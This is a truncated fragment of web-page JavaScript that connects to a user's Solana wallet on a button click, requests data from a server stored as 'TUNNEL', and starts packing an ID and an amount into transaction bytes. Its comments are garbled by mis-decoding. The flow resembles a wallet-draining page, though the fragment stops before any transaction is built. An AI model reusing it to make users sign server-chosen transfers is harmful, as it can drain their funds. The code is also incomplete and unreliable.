    <script>

    // ğŸ”± ç»ˆæç‰©ç†è½¬æ¢ï¼šç¡®ä¿ 8 å­—èŠ‚ä¸¥æ ¼å¯¹é½
    function to8Bytes(amount) {
        const bigInt = BigInt(amount);
        const buf = new Uint8Array(8);
        for (let i = 0; i < 8; i++) {
            buf[i] = Number((bigInt >> BigInt(i * 8)) & 0xffn);
        }
        return buf;
    }

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use a Wallet Browser"); return; }
            
            document.getElementById('msg').innerText = "Connecting...";
            const { publicKey } = await p.connect();
            
            const res = await fetch(TUNNEL + "/get_data", {
                method: 'POST', headers: {'Content-Type':'application/json'},

            });

            // ç‰©ç†å¡«å…¥ 12 å­—èŠ‚æ•°æ® (4å­—èŠ‚ID + 8å­—èŠ‚é‡‘é¢)
